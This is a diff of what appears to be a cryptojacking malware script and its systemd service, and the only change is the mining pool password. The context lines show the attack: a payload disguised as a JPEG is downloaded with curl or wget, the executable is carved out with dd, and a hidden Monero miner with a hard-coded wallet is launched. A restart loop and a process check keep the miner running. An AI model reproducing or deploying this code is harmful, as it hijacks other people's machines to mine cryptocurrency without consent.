@@ -32,7 +32,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/tmp/rcupd --coin monero -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p a -cpu 8
+ExecStart=/tmp/rcupd --coin monero -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p b -cpu 8
 Restart=always
 RestartSec=20
 RestartPreventExitStatus=23
@@ -138,7 +138,7 @@ if [ ! -x "${he_save}" ]; then
     else
         (curl -fsSL ${he_32_url} -o ${he_save_jpg}||wget -q -O ${he_save_jpg} ${he_32_url}) && dd if=${he_save_jpg} of=${he_save} skip=14497 bs=1 &&chmod +x ${he_save}
     fi
-    ${he_save} --coin 'monero' -B -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p a -cpu 8
+    ${he_save} --coin 'monero' -B -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p b -cpu 8
 fi
 
 if [ -e "${he_save_jpg}" ]; then
@@ -147,7 +147,7 @@ fi
 
 process=$(/bin/ps auxf|grep -v grep|grep ${he_save}|wc -l)
 if [ ${process} == 0 ]; then 
-    ${he_save} --coin 'monero' -B -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p a -cpu 8
+    ${he_save} --coin 'monero' -B -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p b -cpu 8
 fi
 
 if [ -x "${he_save}" ]; then
